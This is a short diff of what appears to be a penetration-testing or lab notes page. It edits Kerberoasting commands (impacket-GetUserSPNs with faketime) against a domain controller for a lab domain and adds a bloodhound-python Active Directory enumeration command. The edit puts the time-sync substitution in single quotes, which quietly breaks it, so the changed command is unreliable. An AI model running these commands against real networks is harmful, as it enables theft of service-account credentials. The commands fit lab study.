@@ -1,11 +1,11 @@
 [[Editing Copy Page]]
 
 ```
-faketime "$(ntpdate -q 192.168.200.21 | cut -d ' ' -f 1,2)" impacket-GetUserSPNs -request -dc-ip 192.168.200.21 nagoya-industries.com/fiona.clark 
+faketime '$(ntpdate -q 192.168.200.21 | cut -d ' ' -f 1,2)' impacket-GetUserSPNs -request -dc-ip 192.168.200.21 nagoya-industries.com/fiona.clark 
 ```
 
 ```
-
+bloodhound-python -u '[user]' -p '[pw]' -ns 192.168.200.21 -c All
 ```
 
 ```
